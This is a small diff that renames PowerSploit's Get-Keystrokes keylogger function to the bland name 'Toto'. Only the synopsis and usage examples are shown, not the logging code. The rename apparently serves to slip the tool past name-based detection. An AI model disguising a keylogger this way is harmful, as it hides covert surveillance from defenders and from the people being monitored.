@@ -1,10 +1,10 @@
-function Get-Keystrokes {
+function Toto {
 <#
 .SYNOPSIS
 
     Logs keys pressed, time and the active window.
     
-    PowerSploit Function: Get-Keystrokes
+    PowerSploit Function: Toto
     Original Authors: Chris Campbell (@obscuresec) and Matthew Graeber (@mattifestation)
     Revised By: Jesse Davis (@secabstraction)
     License: BSD 3-Clause
@@ -25,11 +25,11 @@ function Get-Keystrokes {
 
 .EXAMPLE
 
-    Get-Keystrokes -LogPath C:\key.log
+    Toto -LogPath C:\key.log
 
 .EXAMPLE
 
-    Get-Keystrokes -Timeout 20
+    Toto -Timeout 20
     
 .LINK
 
